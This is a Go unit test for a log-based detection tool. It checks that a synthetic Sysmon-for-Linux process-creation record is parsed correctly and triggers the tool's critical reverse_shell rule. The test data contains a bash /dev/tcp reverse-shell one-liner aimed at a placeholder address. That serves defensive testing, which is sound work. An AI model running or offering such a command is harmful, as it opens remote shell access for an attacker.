package main

import (
	"strings"
	"testing"

	"github.com/conor-sometimes/banken/internal/engine"
	"github.com/conor-sometimes/banken/internal/parser"
)

// TestSysmonReverseShellFires is the end-to-end proof that the Sysmon-for-Linux source is wired up:
// a real-shaped Sysmon ProcessCreate record (EventID 1), exactly as sysmonforlinux writes it to
// syslog/the journal -- the Windows Sysmon <Event> XML, prefixed with a syslog header the parser
// must strip -- is parsed to an event.Event and matched against banken's full shipped ruleset, and
// the critical reverse_shell rule fires on it. A golden/unit test (go test), not the live VM test:
// it needs no Microsoft binary, no eBPF, no root, so it runs in CI and locks the field mapping the
// detection depends on (CommandLine carrying the /dev/tcp one-liner through the XML-escaping).
//
// The record is a classic bash /dev/tcp reverse shell. The command line's < and > arrive XML-escaped
// (&lt; &gt;) on the wire, as Sysmon encodes them, so this also proves the parser decodes them back
// to the literal the rule's `CommandLine|contains: /dev/tcp/` keys on.
func TestSysmonReverseShellFires(t *testing.T) {
	const processCreate = `<Event><System>` +
		`<Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/>` +
		`<EventID>1</EventID><Version>5</Version><Level>4</Level>` +
		`<Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords>` +
		`<TimeCreated SystemTime="2026-11-01T14:33:22.279000000Z"/>` +
		`<Channel>Linux-Sysmon/Operational</Channel><Computer>rhel9.example</Computer>` +
		`</System><EventData>` +
		`<Data Name="RuleName">-</Data>` +
		`<Data Name="UtcTime">2026-11-01 14:33:22.279</Data>` +
		`<Data Name="ProcessGuid">{ff032593-5aaa-6907-0000-0010e9d47300}</Data>` +
		`<Data Name="ProcessId">414626</Data>` +
		`<Data Name="Image">/usr/bin/bash</Data>` +
		`<Data Name="CommandLine">bash -i -c exec 3&lt;&gt;/dev/tcp/192.0.2.1/4444</Data>` +
		`<Data Name="CurrentDirectory">/root</Data>` +
		`<Data Name="User">root</Data>` +
		`<Data Name="LogonId">0</Data>` +
		`<Data Name="TerminalSessionId">1</Data>` +
		`<Data Name="IntegrityLevel">no level</Data>` +
		`<Data Name="ParentProcessId">414609</Data>` +
		`<Data Name="ParentImage">/usr/bin/sshd</Data>` +
		`<Data Name="ParentCommandLine">sshd: root@pts/0</Data>` +
		`</EventData></Event>`

	// As it arrives over syslog/the journalctl -o cat bridge: an RFC5424-ish prefix the parser strips.
	line := `<86>1 2026-11-01T14:33:22.279Z rhel9 Linux-Sysmon 414626 - - ` + processCreate

	p := parser.Registry()["sysmon"]
	if p == nil {
		t.Fatal("no sysmon parser registered")
	}
	evs, err := p.Parse(strings.NewReader(line + "\n"))
	if err != nil {
		t.Fatalf("parse: %v", err)
	}
	if len(evs) != 1 {
		t.Fatalf("got %d events, want 1", len(evs))
	}
	ev := evs[0]

	// The parse-to-event step the detection rides on.
	if ev.Source != "sysmon" {
		t.Errorf("Source = %q, want sysmon", ev.Source)
	}
	if want := "bash -i -c exec 3<>/dev/tcp/192.0.2.1/4444"; ev.CommandLine != want {
		t.Fatalf("CommandLine = %q, want %q (XML entities must decode)", ev.CommandLine, want)
	}
	if ev.Image != "/usr/bin/bash" || ev.ParentImage != "/usr/bin/sshd" {
		t.Errorf("Image/ParentImage = %q/%q, want /usr/bin/bash//usr/bin/sshd", ev.Image, ev.ParentImage)
	}

	// Match against the full shipped (embedded baseline) ruleset and show reverse_shell fires.
	rules, _, _ := loadRules(nil, false)
	var hit bool
	for _, a := range engine.New(rules, nil, nil).Match(ev) {
		if a.Rule == "reverse_shell" {
			hit = true
			if a.Level != "critical" {
				t.Errorf("reverse_shell level = %q, want critical", a.Level)
			}
			if a.Source != "sysmon" {
				t.Errorf("alert Source = %q, want sysmon (provenance is the parser's, not the line's)", a.Source)
			}
		}
	}
	if !hit {
		t.Fatal("reverse_shell did not fire on the Sysmon ProcessCreate; the sysmon source is not reaching the rules")
	}
}
